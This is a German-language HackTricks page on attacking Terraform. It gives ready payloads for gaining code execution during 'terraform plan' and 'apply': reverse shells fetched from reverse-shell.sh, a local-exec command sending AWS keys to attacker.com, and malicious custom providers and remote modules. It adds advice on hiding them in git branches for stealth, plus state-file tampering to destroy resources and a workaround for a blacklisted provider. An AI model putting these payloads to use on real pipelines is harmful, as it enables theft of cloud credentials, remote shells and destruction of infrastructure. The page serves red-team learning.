# Terraform-Sicherheit

{% hint style="success" %}
Lerne & √ºbe AWS-Hacking:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP-Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

### Grundinformationen

[Aus den Dokumenten:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform ist ein **Infrastructure as Code-Tool**, mit dem du sowohl **Cloud- als auch On-Prem-Ressourcen** in menschenlesbaren Konfigurationsdateien definieren kannst, die du versionieren, wiederverwenden und teilen kannst. Du kannst dann einen konsistenten Workflow verwenden, um deine gesamte Infrastruktur w√§hrend ihres Lebenszyklus bereitzustellen und zu verwalten. Terraform kann niedrigstufige Komponenten wie Compute-, Speicher- und Netzwerkressourcen sowie hochstufige Komponenten wie DNS-Eintr√§ge und SaaS-Funktionen verwalten.

#### Wie funktioniert Terraform?

Terraform erstellt und verwaltet Ressourcen auf Cloud-Plattformen und anderen Diensten √ºber deren Anwendungsprogrammierschnittstellen (APIs). Anbieter erm√∂glichen es Terraform, mit praktisch jeder Plattform oder jedem Dienst zu arbeiten, der eine zug√§ngliche API hat.

![](<../.gitbook/assets/image (177).png>)

HashiCorp und die Terraform-Community haben bereits **mehr als 1700 Anbieter** geschrieben, um Tausende von verschiedenen Arten von Ressourcen und Diensten zu verwalten, und diese Zahl w√§chst weiter. Du kannst alle √∂ffentlich verf√ºgbaren Anbieter im [Terraform-Registry](https://registry.terraform.io/) finden, einschlie√ülich Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog und vielen mehr.

Der Kern-Workflow von Terraform besteht aus drei Phasen:

* **Schreiben:** Du definierst Ressourcen, die √ºber mehrere Cloud-Anbieter und Dienste verteilt sein k√∂nnen. Zum Beispiel k√∂nntest du eine Konfiguration erstellen, um eine Anwendung auf virtuellen Maschinen in einem Virtual Private Cloud (VPC)-Netzwerk mit Sicherheitsgruppen und einem Lastenausgleich bereitzustellen.
* **Planen:** Terraform erstellt einen Ausf√ºhrungsplan, der die Infrastruktur beschreibt, die es basierend auf der vorhandenen Infrastruktur und deiner Konfiguration erstellen, aktualisieren oder zerst√∂ren wird.
* **Anwenden:** Nach Genehmigung f√ºhrt Terraform die vorgeschlagenen Operationen in der richtigen Reihenfolge aus und respektiert dabei alle Ressourcenabh√§ngigkeiten. Wenn du beispielsweise die Eigenschaften einer VPC aktualisierst und die Anzahl der virtuellen Maschinen in dieser VPC √§nderst, wird Terraform die VPC neu erstellen, bevor es die virtuellen Maschinen skalieren kann.

![](<../.gitbook/assets/image (215).png>)

### Terraform-Labor

Installiere einfach Terraform auf deinem Computer.

Hier hast du eine [Anleitung](https://learn.hashicorp.com/tutorials/terraform/install-cli) und hier hast du den [besten Weg, um Terraform herunterzuladen](https://www.terraform.io/downloads).

### RCE in Terraform

Terraform **hat keine Plattform, die eine Webseite oder einen Netzwerkdienst** bereitstellt, den wir auflisten k√∂nnen, daher ist der einzige Weg, Terraform zu kompromittieren, **in der Lage zu sein, Terraform-Konfigurationsdateien hinzuzuf√ºgen/zu √§ndern**.

Allerdings ist Terraform ein **sehr sensibler Bestandteil**, der kompromittiert werden kann, da es **privilegierten Zugriff** auf verschiedene Standorte hat, damit es ordnungsgem√§√ü funktioniert.

Der Hauptweg f√ºr einen Angreifer, um das System, auf dem Terraform l√§uft, zu kompromittieren, besteht darin, **das Repository zu kompromittieren, das Terraform-Konfigurationen speichert**, da sie irgendwann **interpretiert** werden.

Tats√§chlich gibt es L√∂sungen, die **Terraform-Plan/Apply automatisch nach der Erstellung eines PRs** ausf√ºhren, wie **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Wenn du in der Lage bist, eine Terraform-Datei zu kompromittieren, gibt es verschiedene M√∂glichkeiten, wie du RCE durchf√ºhren kannst, wenn jemand `terraform plan` oder `terraform apply` ausf√ºhrt.

#### Terraform-Plan

Terraform-Plan ist der **am h√§ufigsten verwendete Befehl** in Terraform, und Entwickler/L√∂sungen, die Terraform verwenden, rufen ihn st√§ndig auf, sodass der **einfachste Weg, RCE zu erhalten**, darin besteht, sicherzustellen, dass du eine Terraform-Konfigurationsdatei vergiftest, die willk√ºrliche Befehle in einem `terraform plan` ausf√ºhrt.

**Verwendung eines externen Anbieters**

Terraform bietet den [`external`-Anbieter](https://registry.terraform.io/providers/hashicorp/external/latest/docs), der eine M√∂glichkeit bietet, zwischen Terraform und externen Programmen zu interagieren. Du kannst die `external`-Datenquelle verwenden, um willk√ºrlichen Code w√§hrend eines `plan` auszuf√ºhren.

Wenn du in einer Terraform-Konfigurationsdatei etwas wie das Folgende injizierst, wird eine Reverse-Shell ausgef√ºhrt, wenn `terraform plan` ausgef√ºhrt wird:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Verwendung eines benutzerdefinierten Providers**

Ein Angreifer k√∂nnte einen [benutzerdefinierten Provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup) an das [Terraform-Registry](https://registry.terraform.io/) senden und ihn dann im Terraform-Code in einem Feature-Branch hinzuf√ºgen ([Beispiel hier](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Der Provider wird im `init` heruntergeladen und f√ºhrt den sch√§dlichen Code aus, wenn `plan` ausgef√ºhrt wird.

Ein Beispiel finden Sie unter [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**Verwendung eines externen Verweises**

Beide genannten Optionen sind n√ºtzlich, aber nicht sehr stealthy (die zweite ist stealthier, aber komplexer als die erste). Sie k√∂nnen diesen Angriff sogar auf eine **stealthier Weise** durchf√ºhren, indem Sie diese Vorschl√§ge befolgen:

* Anstatt die rev shell direkt in die Terraform-Datei einzuf√ºgen, k√∂nnen Sie **eine externe Ressource laden**, die die rev shell enth√§lt:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Sie k√∂nnen den rev shell Code in [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules) finden.

* Verwenden Sie in der externen Ressource die **ref**-Funktion, um den **terraform rev shell code in einem Branch** innerhalb des Repos zu verbergen, etwas wie: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

#### Terraform Apply

Terraform apply wird ausgef√ºhrt, um alle √Ñnderungen anzuwenden. Sie k√∂nnen es auch missbrauchen, um RCE zu erhalten, indem Sie **eine b√∂sartige Terraform-Datei mit** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)** injizieren.**\
Sie m√ºssen nur sicherstellen, dass eine Payload wie die folgenden im `main.tf`-Datei endet:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Folgen Sie den **Vorschl√§gen aus der vorherigen Technik**, um diesen Angriff auf eine **diskretere Weise unter Verwendung externer Referenzen** durchzuf√ºhren.

### Secrets Dumps

Sie k√∂nnen **geheime Werte, die von terraform verwendet werden, ausgeben**, indem Sie `terraform apply` ausf√ºhren und der Terraform-Datei etwas hinzuf√ºgen wie:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Missbrauch von Terraform-Zustandsdateien

Falls Sie Schreibzugriff auf Terraform-Zustandsdateien haben, aber den Terraform-Code nicht √§ndern k√∂nnen, bietet [**diese Forschung**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) einige interessante M√∂glichkeiten, um die Datei auszunutzen:

#### Ressourcen l√∂schen <a href="#deleting-resources" id="deleting-resources"></a>

Es gibt 2 M√∂glichkeiten, Ressourcen zu zerst√∂ren:

1. **F√ºgen Sie eine Ressource mit einem zuf√§lligen Namen in die Zustandsdatei ein, die auf die echte Ressource verweist, die gel√∂scht werden soll**

Da Terraform sehen wird, dass die Ressource nicht existieren sollte, wird es sie zerst√∂ren (entsprechend der angegebenen echten Ressourcen-ID). Beispiel von der vorherigen Seite:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **√Ñndern Sie die Ressource so, dass sie gel√∂scht wird, ohne dass eine Aktualisierung m√∂glich ist (damit sie gel√∂scht und neu erstellt wird)**

F√ºr eine EC2-Instanz reicht es aus, den Typ der Instanz zu √§ndern, damit Terraform sie l√∂scht und neu erstellt.

#### RCE

Es ist auch m√∂glich, einen [benutzerdefinierten Anbieter](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) zu erstellen und einfach einen der Anbieter in der Terraform-Zustandsdatei durch den b√∂sartigen zu ersetzen oder eine leere Ressource mit dem b√∂sartigen Anbieter hinzuzuf√ºgen. Beispiel aus der urspr√ºnglichen Forschung:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
### Ersetzen des auf der Blacklist stehenden Providers

Falls Sie auf eine Situation sto√üen, in der `hashicorp/external` auf der Blacklist steht, k√∂nnen Sie den `external` Provider wie folgt neu implementieren. Hinweis: Wir verwenden einen Fork des External Providers, der von https://registry.terraform.io/providers/nazarewk/external/latest ver√∂ffentlicht wurde. Sie k√∂nnen auch Ihren eigenen Fork oder Ihre eigene Neuimplementierung ver√∂ffentlichen.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Dann k√∂nnen Sie `external` wie gewohnt verwenden.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
### Audit Tools

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec verwendet statische Analyse Ihres Terraform-Codes, um potenzielle Fehlkonfigurationen zu erkennen.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan ist ein statischer Code-Analyzer f√ºr Infrastructure as Code.

### References

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
